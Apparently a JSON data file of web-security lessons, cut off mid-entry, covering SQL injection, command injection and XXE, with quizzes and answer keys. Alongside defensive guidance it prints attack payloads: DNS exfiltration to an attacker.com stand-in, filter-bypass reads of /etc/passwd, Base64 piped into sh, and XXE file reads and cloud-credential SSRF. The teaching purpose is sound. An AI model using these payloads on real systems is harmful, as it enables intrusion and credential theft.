  "web-01-07": {"html":"\n<h2>Wide-Byte Injection &amp; Second-Order SQL Injection</h2>\n\n<p>Developers frequently assume that invoking string-escaping routines (like PHP's <code>addslashes()</code> or <code>mysql_real_escape_string()</code>) provides absolute immunity against SQL injection. However, multibyte character encoding discrepancies and delayed query execution pipelines regularly defeat naive escaping mechanisms.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand how GBK multibyte character sets absorb escape backslashes (<code>0x5c</code>)<br>\n  ② Master the classic wide-byte probe <code>%df%27</code> and the risks of <code>SET NAMES gbk</code><br>\n  ③ Analyze the two-phase lifecycle of Second-Order SQL Injection (Storage vs. Execution)<br>\n  ④ Eliminate encoding and second-order flaws via unified UTF-8 and prepared statements</p>\n</div>\n\n<h3>Step 1: Wide-Byte Mechanics — How Backslashes Vanish</h3>\n\n<p>In <strong>GBK multibyte encoding</strong>, characters consist of two bytes. If the first byte has an ASCII value greater than 128 (<code>0x80</code>), the decoder grabs the subsequent byte to form a single glyph.</p>\n<div class=\"code-block\">\n<pre><code class=\"language-text\">1. Attacker supplies: %df'\n2. Escaping routine injects backslash before single quote: \\ (0x5c)\n3. Combined byte stream: %df %5c %27\n4. GBK engine pairs %df (0xdf) with %5c (0x5c), forming valid Chinese character \"運\"\n5. The backslash is consumed!\n6. The trailing %27 (single quote) survives unescaped, restoring syntax execution!</code></pre>\n</div>\n\n<h3>Step 2: Second-Order SQL Injection — The Trojan Horse</h3>\n\n<p>Second-order vulnerabilities exploit developer trust in existing database records:</p>\n<ol>\n  <li><strong>Stage 1 (Storage):</strong> A user registers with username <code>admin'#</code>. The input is escaped and stored as literal <code>admin'#</code> in the database.</li>\n  <li><strong>Stage 2 (Execution):</strong> Later, a password reset procedure retrieves the username and concatenates it into an administrative query:\n    <div class=\"code-block\"><pre><code class=\"language-sql\">UPDATE users SET password = '$new_pass' WHERE username = '$stored_username';</code></pre></div>\n    The stored single quote breaks the <code>WHERE</code> clause and <code>#</code> comments out the remainder, resetting all user passwords!\n  </li>\n</ol>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> Why does configuring database connections with <code>utf8mb4</code> completely mitigate wide-byte injection?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> In UTF-8, ASCII characters (including backslash <code>0x5c</code>) are encoded strictly as single bytes and can never be merged with preceding bytes to form new codepoints.</p>\n  </div>\n</details>\n\n<p><strong>Exercise 2:</strong> Why does parameterized execution protect against second-order injection even when data is retrieved from a database?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> The database protocol binds retrieved data purely as variable values, ensuring special characters are never re-evaluated as syntax.</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Flaw</th><th>Root Cause</th><th>Definitive Remedy</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Wide-Byte</strong></td><td>Multibyte character absorption of escape bytes (0x5c)</td><td>Enforce <code>utf8mb4</code> across connection and schema</td></tr>\n    <tr><td><strong>Second-Order</strong></td><td>Concatenating trusted database records into dynamic queries</td><td>Universal prepared statement parameterization</td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"What is the technical root cause of wide-byte SQL injection?","options":["Weak administrator passwords configured on the DBMS","Multibyte character sets (e.g. GBK) merge high bytes (>=0x80) with escape backslashes (0x5c), freeing single quotes","Insufficient RAM on the web server causing character corruption","Outdated firewall rule definitions"],"answer":1,"explanation":"In GBK multibyte encoding, a leading high byte absorbs the backslash escape byte (0x5c) to create a valid glyph, leaving the single quote unescaped."},{"question":"What is the definitive remediation for wide-byte injection flaws?","options":["Filtering single quotes on the client side using JavaScript","Enforcing utf8mb4 across application connections and using parameterized queries","Downgrading PHP runtimes to version 5.2","Rejecting all Chinese or multibyte input globally"],"answer":1,"explanation":"In UTF-8, backslash (0x5c) is always a 1-byte ASCII symbol that cannot be absorbed. Combined with parameterization, this permanently fixes wide-byte SQLi."}]},
  "web-01-08": {"html":"\n<h2>Ultimate SQLi Defense: Prepared Statements, PDO &amp; Defense-in-Depth</h2>\n\n<p>Throughout security history, developers attempted countless ad-hoc defenses: keyword blacklists, regex filtering, and character escaping. All were consistently bypassed. Security was achieved only when engineering adopted <strong>Prepared Statements (Parameterized Queries)</strong>: separating the SQL syntax structure from runtime data parameters.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand why prepared statements provide mathematical immunity against injection<br>\n  ② Implement safe parameterized query templates in PHP PDO, Python, Java, and Go<br>\n  ③ Secure dynamic query components (ORDER BY and table names) using allowlists<br>\n  ④ Construct a 4-tier enterprise defense-in-depth model</p>\n</div>\n\n<h3>Step 1: The Principle of Syntax-Data Separation</h3>\n\n<p>Prepared execution splits query handling into two discrete phases:</p>\n<ol>\n  <li><strong>Compilation Phase:</strong> The query template <code>SELECT * FROM users WHERE email = ?</code> is transmitted and compiled into an Abstract Syntax Tree (AST). The structure is immutable.</li>\n  <li><strong>Execution Phase:</strong> Parameters are transmitted across the binary protocol as raw literals. Even if the parameter contains <code>' OR 1=1 --</code>, the database treats it strictly as a literal search string.</li>\n</ol>\n\n<h3>Step 2: Enterprise Language Implementation Matrix</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Platform</th><th>Secure Pattern</th><th>Vulnerable Anti-Pattern</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>PHP (PDO)</strong></td>\n      <td><code>$stmt = $pdo->prepare('SELECT * FROM users WHERE email = ?');<br>$stmt->execute([$email]);</code></td>\n      <td><code>$pdo->query(\"SELECT * FROM users WHERE email = '$email'\");</code></td>\n    </tr>\n    <tr>\n      <td><strong>Python (MySQL)</strong></td>\n      <td><code>cursor.execute(\"SELECT * FROM users WHERE email = %s\", (email,))</code></td>\n      <td><code>cursor.execute(f\"SELECT * FROM users WHERE email = '{email}'\")</code></td>\n    </tr>\n    <tr>\n      <td><strong>Java (JDBC)</strong></td>\n      <td><code>PreparedStatement ps = conn.prepareStatement(\"SELECT * FROM users WHERE id = ?\");<br>ps.setInt(1, id);</code></td>\n      <td><code>stmt.executeQuery(\"SELECT * FROM users WHERE id = \" + id);</code></td>\n    </tr>\n    <tr>\n      <td><strong>Go (database/sql)</strong></td>\n      <td><code>db.Query(\"SELECT * FROM users WHERE email = ?\", email)</code></td>\n      <td><code>db.Query(fmt.Sprintf(\"SELECT * FROM users WHERE email = '%s'\", email))</code></td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 3: Defending Unparameterizable Identifiers via Allowlists</h3>\n\n<p>Identifiers such as table names, column names, and <code>ORDER BY</code> directions cannot accept parameter markers (<code>?</code>). Protect them using strict server-side allowlists:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-php\">// Secure Allowlist Mapping\n$allowed_sorts = ['date' => 'created_at', 'price' => 'unit_price'];\n$sort_col = $allowed_sorts[$_GET['sort'] ?? 'date'] ?? 'created_at';\n$sql = \"SELECT * FROM products ORDER BY {$sort_col} ASC\";</code></pre>\n</div>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> Why should PHP PDO disable emulated prepares (<code>ATTR_EMULATE_PREPARES = false</code>)?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> Emulated prepares perform client-side string substitution rather than true server-side binary protocol parameterization, leaving subtle edge-case encoding bypass vectors open.</p>\n  </div>\n</details>\n\n<p><strong>Exercise 2:</strong> In what scenario is parameterized querying alone insufficient?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> When dynamic table names, column names, or sorting clauses must be determined at runtime. These must be guarded with strict allowlists.</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Layer</th><th>Control Measure</th><th>Objective</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Layer 1 (Core)</strong></td><td>Parameterized Queries</td><td>Immunize against SQL grammar modification</td></tr>\n    <tr><td><strong>Layer 2 (Identifiers)</strong></td><td>Strict Allowlists</td><td>Validate unparameterizable table/column identifiers</td></tr>\n    <tr><td><strong>Layer 3 (Database)</strong></td><td>Least Privilege Access</td><td>Prevent cross-schema read/write access</td></tr>\n    <tr><td><strong>Layer 4 (Perimeter)</strong></td><td>Web Application Firewall</td><td>Filter automated scans and provide virtual patching</td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"Why do Prepared Statements provide mathematical immunity against SQL Injection?","options":["They automatically encrypt all parameters with Base64","The query AST is compiled beforehand; parameters are bound strictly as data literals and cannot alter the execution tree","They enforce high-entropy passwords on all user accounts","They close the database network listener to outside traffic"],"answer":1,"explanation":"Prepared execution separates syntax compilation from parameter binding. User input is treated strictly as data literals without command parsing."},{"question":"How should unparameterizable SQL elements (such as dynamic ORDER BY columns) be secured?","options":["Direct string concatenation without validation","Enforcing strict server-side allowlist mapping","Base64 encoding the column names before concatenation","Switching from HTTP GET to HTTP POST requests"],"answer":1,"explanation":"Identifiers cannot be bound with placeholders. A strict server-side allowlist mapping ensures only vetted, valid column names reach the database."}]},
  "web-02-01": {"html":"\n<h2>Command Injection Fundamentals &amp; Separators</h2>\n\n<p>Many web services interact with system-level commands, such as network utilities that execute <code>ping -c 4 &lt;IP&gt;</code> to test connectivity. When user-supplied IP strings are concatenated into a shell invocation, attackers can append arbitrary commands to compromise the host.</p>\n\n<p>Analogy: You send a runner to order coffee with a note saying <em>\"Buy one espresso\"</em>. If someone appends: <strong>\"Buy one espresso; and also steal the accounting ledger from the desk\"</strong>, an undiscerning courier following instructions literally results in disaster. This is <strong>OS Command Injection</strong>.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand command injection: untrusted input evaluated as system shell instructions<br>\n  ② Master cross-platform separator operators: <code>;</code>, <code>&amp;</code>, <code>&amp;&amp;</code>, <code>|</code>, <code>||</code><br>\n  ③ Leverage backtick execution (`cmd`) and command substitution <code>$(cmd)</code><br>\n  ④ Reproduce minimal command injection vulnerabilities and probe target environments</p>\n</div>\n\n<h3>Step 1: Cross-Platform Separator Matrix</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Operator</th><th>Pattern</th><th>Execution Semantics</th><th>Platform</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Semicolon <code>;</code></strong></td><td><code>cmd1 ; cmd2</code></td><td>Sequential execution regardless of cmd1 exit code</td><td>Linux / Unix</td></tr>\n    <tr><td><strong>Single Ampersand <code>&amp;</code></strong></td><td><code>cmd1 &amp; cmd2</code></td><td>cmd1 runs in background; cmd2 begins immediately</td><td>Linux / Windows</td></tr>\n    <tr><td><strong>Double Ampersand <code>&amp;&amp;</code></strong></td><td><code>cmd1 &amp;&amp; cmd2</code></td><td>Logical AND: cmd2 executes only if cmd1 succeeds (exit code 0)</td><td>Linux / Windows</td></tr>\n    <tr><td><strong>Single Pipe <code>|</code></strong></td><td><code>cmd1 | cmd2</code></td><td>Pipe: stdout of cmd1 passes to stdin of cmd2</td><td>Linux / Windows</td></tr>\n    <tr><td><strong>Double Pipe <code>||</code></strong></td><td><code>cmd1 || cmd2</code></td><td>Logical OR: cmd2 executes only if cmd1 fails (non-zero exit)</td><td>Linux / Windows</td></tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Subshell Command Substitution</h3>\n\n<p>Bash allows embedding output of one command inside another:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-bash\"># Subshell execution\nping $(whoami).attacker.com\n\n# Backtick execution\nping `id`.dnslog.cn</code></pre>\n</div>\n<p>This technique is essential during blind command injection to exfiltrate results via DNS queries.</p>\n\n<h3>Step 3: Vulnerable vs. Secure Pattern</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-python\"># ❌ Vulnerable: Shell string concatenation\nimport os\ntarget = \"127.0.0.1; whoami\"\nos.system(f\"ping -c 1 {target}\")</code></pre>\n</div>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> An endpoint runs <code>ping -c 1 $ip</code>. Why does <code>invalid_ip &amp;&amp; id</code> fail, and how do you fix it?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> <code>&amp;&amp;</code> short-circuits on failure. If the first command fails, use <code>||</code> or <code>;</code> or <code>|</code> to force execution of the second command.</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Operator</th><th>Primary Advantage</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><code>;</code></td><td>Sequential independent execution (Linux)</td></tr>\n    <tr><td><code>&amp;</code> / <code>&amp;&amp;</code></td><td>Cross-platform support across Linux and Windows</td></tr>\n    <tr><td><code>|</code> / <code>||</code></td><td>Guaranteed execution when preceding command fails</td></tr>\n    <tr><td><code>$()</code> / ``</td><td>Nested evaluation for DNS/out-of-band data exfiltration</td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"In Linux Bash, which separator executes the second command regardless of whether the first command succeeded?","options":["&&",";","||","&"],"answer":1,"explanation":"The semicolon (;) is the standard sequential separator executing subsequent commands unconditionally."},{"question":"Which syntax evaluates a command and substitutes its output into another command for out-of-band exfiltration?","options":["$(command) or `command`","--+ or #","/* command */","%00"],"answer":0,"explanation":"Command substitution via $(command) or backticks evaluates the inner command and embeds its stdout into parameters."}]},
  "web-02-02": {"html":"\n<h2>Command Injection Evasion: Spaces &amp; Chars</h2>\n\n<p>Defenders and web application firewalls (WAFs) often deploy naive blacklists: blocking spaces, <code>cat</code>, or <code>flag</code> keywords. However, modern command shells feature extensive grammar shortcuts and expansion semantics that render static word filters ineffective.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Bypass space restrictions using <code>${IFS}</code>, input redirection <code>&lt;</code>, and brace expansion<br>\n  ② Neutralize keyword blacklists via variable concatenation, globbing (<code>?</code>, <code>*</code>), and empty variables<br>\n  ③ Pipe Base64-encoded strings directly into command shells for full evasion<br>\n  ④ Diagnose filter rules systematically through iterative testing</p>\n</div>\n\n<h3>Step 1: Space Bypass Cheat Sheet</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Technique</th><th>Example Payload</th><th>Mechanism</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Internal Field Separator</strong></td><td><code>cat${IFS}/etc/passwd</code><br><code>cat$IFS$9/etc/passwd</code></td><td><code>$IFS</code> defaults to space/tab/newline; <code>$9</code> is empty</td></tr>\n    <tr><td><strong>Input Redirection</strong></td><td><code>cat&lt;/etc/passwd</code></td><td>Redirects stdin directly from file without space</td></tr>\n    <tr><td><strong>Brace Expansion</strong></td><td><code>{cat,/etc/passwd}</code></td><td>Bash expands comma-separated values into arguments</td></tr>\n    <tr><td><strong>Tab Character (%09)</strong></td><td><code>cat%09/etc/passwd</code></td><td>ASCII Tab parsed as valid token delimiter</td></tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Keyword Blacklist Evasion</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-bash\"># Variable concatenation\na=c; b=at; $a$b /etc/passwd\n\n# Empty variables\nc$*at /etc/pass$@wd\nc''at /etc/pass\"\"wd\n\n# Globbing wildcards\n/bin/c?t /etc/pas???d\n/???/n?t?at -an\n\n# Base64 pipe execution\necho Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh</code></pre>\n</div>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> How can you read <code>flag.txt</code> if spaces and the word <code>cat</code> are blocked?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> <code>tac&lt;flag.txt</code>, <code>more$IFS$9flag.txt</code>, or <code>head$IFS$9fl*.txt</code>.</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Filter Target</th><th>Primary Bypass Method</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Spaces</strong></td><td><code>${IFS}</code>, <code>$IFS$9</code>, <code>&lt;</code> redirection</td></tr>\n    <tr><td><strong>Command Words</strong></td><td>Equivalent utilities (<code>tac</code>, <code>more</code>, <code>nl</code>)</td></tr>\n    <tr><td><strong>Filenames</strong></td><td>Wildcards (<code>?</code>, <code>*</code>) and string concatenation</td></tr>\n    <tr><td><strong>Complex Rules</strong></td><td>Base64 encoded payload piped into <code>sh</code></td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"Which environment variable is standardly used to replace spaces when space characters are filtered?","options":["${IFS}","${PATH}","${HOME}","${SHELL}"],"answer":0,"explanation":"$IFS (Internal Field Separator) contains whitespace by default and serves as a direct space replacement."},{"question":"Which pattern decodes and executes a Base64-encoded command via a pipe?","options":["echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh","cat /etc/passwd > base64","base64 -e /etc/passwd","curl http://127.0.0.1/base64"],"answer":0,"explanation":"echo <payload> | base64 -d | sh pipes the decoded plaintext directly into a shell interpreter."}]},
  "web-02-03": {"html":"\n<h2>Command Injection Ultimate Defense &amp; Hardening</h2>\n\n<p>Command injection occurs because developers execute untrusted strings inside a system shell (<code>/bin/sh</code> or <code>cmd.exe</code>). Shells exist to interpret pipelines, macro replacements, and wildcard expansions. Executing untrusted strings in a shell inevitably opens security vulnerabilities.</p>\n\n<p>This micro-lesson explains how <strong>kernel-level execution isolation</strong> with argument arrays permanently neutralizes command injection across major enterprise programming languages.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand <code>execve</code> isolation: separating binary files from argument arrays<br>\n  ② Implement secure command execution across Python, Node.js, PHP, and Go<br>\n  ③ Enforce strict allowlists using regular expressions prior to process creation<br>\n  ④ Limit blast radius using least-privilege accounts and container sandboxing</p>\n</div>\n\n<h3>Step 1: The Argument Array Isolation Principle</h3>\n\n<p>The Linux <code>execve(file, argv[], envp[])</code> syscall directly launches the executable, passing each array entry purely as data. Because no intermediary shell process runs, characters like <code>;</code> and <code>|</code> are never parsed as commands, rendering injection impossible.</p>\n\n<h3>Step 2: Enterprise Language Implementation Matrix</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Language</th><th>Secure Pattern (Argument Arrays)</th><th>Vulnerable Pattern</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Python</strong></td>\n      <td><code>subprocess.run([\"ping\", \"-c\", \"1\", ip], shell=False)</code></td>\n      <td><code>os.system(f\"ping {ip}\")</code><br><code>shell=True</code></td>\n    </tr>\n    <tr>\n      <td><strong>Node.js</strong></td>\n      <td><code>execFile('ping', ['-c', '1', ip], cb)</code></td>\n      <td><code>exec(`ping ${ip}`, cb)</code></td>\n    </tr>\n    <tr>\n      <td><strong>Go</strong></td>\n      <td><code>exec.Command(\"ping\", \"-c\", \"1\", ip).Run()</code></td>\n      <td><code>exec.Command(\"sh\", \"-c\", \"ping \" + ip)</code></td>\n    </tr>\n    <tr>\n      <td><strong>PHP</strong></td>\n      <td><code>escapeshellarg($ip)</code></td>\n      <td><code>system(\"ping \" . $ip)</code></td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> Why does passing a list with <code>shell=False</code> in Python prevent injection?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> It bypasses the shell interpreter and invokes the binary directly via <code>execve</code>, treating all elements in the list strictly as literal arguments.</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Layer</th><th>Action</th><th>Mechanism</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Core</strong></td><td>Pass argument arrays (shell=False)</td><td>Prevents shell command parsing via execve</td></tr>\n    <tr><td><strong>Validation</strong></td><td>Strict regex allowlist on inputs</td><td>Restricts inputs to valid alphanumeric/IP formats</td></tr>\n    <tr><td><strong>System</strong></td><td>Run as non-privileged service user</td><td>Restricts access to sensitive system assets</td></tr>\n    <tr><td><strong>Sandbox</strong></td><td>Read-only container filesystem</td><td>Prevents persistence of malicious payloads</td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"In Python, which invocation pattern permanently prevents command injection?","options":["os.system(f'ping -c 1 {ip}')","subprocess.run(['ping', '-c', '1', ip], shell=False)","subprocess.Popen(f'ping {ip}', shell=True)","os.popen('ping ' + ip)"],"answer":1,"explanation":"Passing a list of arguments with shell=False delegates directly to execve without invoking a shell interpreter."},{"question":"Why is shell=True considered insecure when handling user-controlled data?","options":["It causes memory leaks across processes","It spawns an intermediate shell interpreter that parses metacharacters like semicolons and pipes as syntax","It is unsupported on POSIX systems","It wipes active environment variables"],"answer":1,"explanation":"shell=True evaluates the input string through /bin/sh or cmd.exe, allowing injected shell operators to execute."}]},
  "web-03-01": {"html":"\n<h2>XXE Fundamentals: DTD &amp; Entities</h2>\n\n<p>Modern applications frequently process XML payloads during payment transactions, enterprise integrations, and office document parsing. However, the standard XML specification includes a dangerous historical capability: <strong>Document Type Definitions (DTD) and External Entities</strong>.</p>\n\n<p>Analogy: XML entities function like macro variables in text. If an entity is defined as an external reference (<code>SYSTEM</code>), the parser fetches the referenced URI (such as local system files or remote URLs) and replaces the variable with its content. This creates <strong>XML External Entity (XXE)</strong> vulnerabilities.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Master XML document anatomy: declaration, DTD section, and root elements<br>\n  ② Differentiate between internal entities, external entities, and parameter entities<br>\n  ③ Understand how the <code>SYSTEM</code> keyword opens filesystem and network access<br>\n  ④ Construct a functional minimal XML entity test payload</p>\n</div>\n\n<h3>Step 1: XML Structure &amp; Entity Types</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-xml\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE document [\n  &lt;!ENTITY company \"CyberEdu Security Corp\"&gt;\n]&gt;\n&lt;document&gt;\n  &lt;sender&gt;&amp;company;&lt;/sender&gt;\n&lt;/document&gt;</code></pre>\n</div>\n\n<h3>Step 2: Entity Reference Matrix</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Entity Type</th><th>Definition Syntax</th><th>Reference Form</th><th>Scope</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Internal General</strong></td><td><code>&lt;!ENTITY name \"val\"&gt;</code></td><td><code>&amp;name;</code></td><td>Document body macro expansion</td></tr>\n    <tr><td><strong>External General</strong></td><td><code>&lt;!ENTITY name SYSTEM \"URI\"&gt;</code></td><td><code>&amp;name;</code></td><td>Fetches remote or local filesystem resources</td></tr>\n    <tr><td><strong>Parameter Entity</strong></td><td><code>&lt;!ENTITY % name SYSTEM \"URI\"&gt;</code></td><td><code>%name;</code></td><td>Restricted to DTD declarations; used in Blind XXE</td></tr>\n  </tbody>\n</table>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> What does the <code>SYSTEM</code> identifier indicate in an entity declaration?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> It instructs the parser that the entity content resides at a local URI or external URL, causing the parser to fetch the resource.</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Concept</th><th>Key Takeaway</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>XML DTD</strong></td><td>Defines document grammar and entity aliases</td></tr>\n    <tr><td><strong>External Entity</strong></td><td>Fetches external resources via SYSTEM identifiers</td></tr>\n    <tr><td><strong>Vulnerability Root</strong></td><td>Default parser configurations expanding untrusted external entities</td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"In XML DTD syntax, which reserved keyword declares an external entity pointing to an external URI?","options":["SYSTEM","EXTERNAL","INCLUDE","IMPORT"],"answer":0,"explanation":"The SYSTEM keyword declares that the entity content resides at a local or remote URI."},{"question":"What is the key syntactical feature of parameter entities in XML DTDs?","options":["They are declared with a % symbol and can only be referenced inside the DTD","They are restricted to binary image formats","They require JSON encapsulation","They do not require names"],"answer":0,"explanation":"Parameter entities use % in their definition and reference syntax, functioning strictly within DTD scopes."}]},
  "web-03-02": {"html":"\n<h2>XXE in Action: File Read &amp; SSRF</h2>\n\n<p>Armed with external entities and URI handlers, an adversary can compromise confidentiality across the host system. This micro-lesson demonstrates extracting local configuration files, leveraging wrapper protocols, and weaponizing XXE into Server-Side Request Forgery (SSRF).</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Construct cross-platform local file inclusion payloads for Linux and Windows<br>\n  ② Use <code>php://filter</code> wrappers to retrieve source code containing XML delimiters<br>\n  ③ Pivot XXE into internal network SSRF probes targeting cloud metadata endpoints<br>\n  ④ Execute Blind Out-of-Band (OOB) exfiltration channels</p>\n</div>\n\n<h3>Step 1: Local File Extraction Playbook</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Environment</th><th>Payload Definition</th><th>Target</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Linux</strong></td><td><code>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;</code></td><td>System user accounts</td></tr>\n    <tr><td><strong>Windows</strong></td><td><code>&lt;!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\"&gt;</code></td><td>System configuration</td></tr>\n    <tr><td><strong>PHP Source</strong></td><td><code>&lt;!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\"&gt;</code></td><td>Base64 encoded source files</td></tr>\n  </tbody>\n</table>\n\n<h3>Step 2: SSRF &amp; Cloud Metadata Pivoting</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-xml\">&lt;!DOCTYPE data [\n  &lt;!ENTITY meta SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"&gt;\n]&gt;\n&lt;data&gt;&amp;meta;&lt;/data&gt;</code></pre>\n</div>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> Why does parsing raw source code files with <code>file:///</code> often fail?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> Characters like <code>&lt;</code>, <code>&gt;</code>, and <code>&amp;</code> collide with XML parsing rules, triggering syntax errors. Base64 encoding circumvents this restriction.</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Vector</th><th>Protocol</th><th>Impact</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Arbitrary File Read</strong></td><td><code>file:///</code></td><td>Sensitive credential and configuration exposure</td></tr>\n    <tr><td><strong>Internal SSRF</strong></td><td><code>http://</code></td><td>Port scanning and cloud token extraction</td></tr>\n    <tr><td><strong>Blind Exfiltration</strong></td><td>OOB HTTP/DNS</td><td>Data exfiltration without reflected page output</td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"In a PHP environment, which wrapper safely extracts source code containing XML delimiters via XXE?","options":["php://filter/read=convert.base64-encode/resource=config.php","http://localhost/config.php","file:///config.php","zip://config.php"],"answer":0,"explanation":"The php://filter Base64 wrapper encodes content into ASCII strings that never conflict with XML syntax."},{"question":"When an application produces no reflected output from parsed XML, which method enables data exfiltration?","options":["Blind XXE via Out-of-Band (OOB) HTTP/DNS channels","SQL UNION queries","Offline brute-force guessing","Changing the response code to 200"],"answer":0,"explanation":"Blind XXE references external DTDs that append extracted file contents to outbound HTTP/DNS query strings."}]},
  "web-03-03": {"html":"\n<h2>XXE Ultimate Defense &amp; Hardening</h2>\n\n<p>Blacklisting keywords like <code>SYSTEM</code> or <code>ENTITY</code> with regular expressions fails against encoding variations and external DTD includes. The definitive remediation for XXE is <strong>explicitly disabling external entity resolution and DTD processing within the parser configuration</strong>.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Implement the disallow-doctype-decl pattern across enterprise XML parsers<br>\n  ② Harden Java <code>DocumentBuilderFactory</code> using standard defensive features<br>\n  ③ Configure safe parsing in PHP (libxml) and Python (defusedxml)<br>\n  ④ Migrate application protocols toward modern JSON formats</p>\n</div>\n\n<h3>Step 1: Enterprise Hardening Cheat Sheet</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Platform</th><th>Secure Configuration</th><th>Defensive Action</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Java (DOM)</strong></td>\n      <td><code>dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);</code></td>\n      <td>Throws fatal exception upon encountering DOCTYPE</td>\n    </tr>\n    <tr>\n      <td><strong>Python</strong></td>\n      <td><code>import defusedxml.ElementTree as ET</code></td>\n      <td>Drop-in replacement blocking entity bombs and external fetching</td>\n    </tr>\n    <tr>\n      <td><strong>PHP</strong></td>\n      <td><code>libxml_disable_entity_loader(true);</code></td>\n      <td>Blocks external entity loading (default in PHP 8.0+)</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> Why is <code>disallow-doctype-decl</code> the most effective setting in Java?</p>\n<details>\n  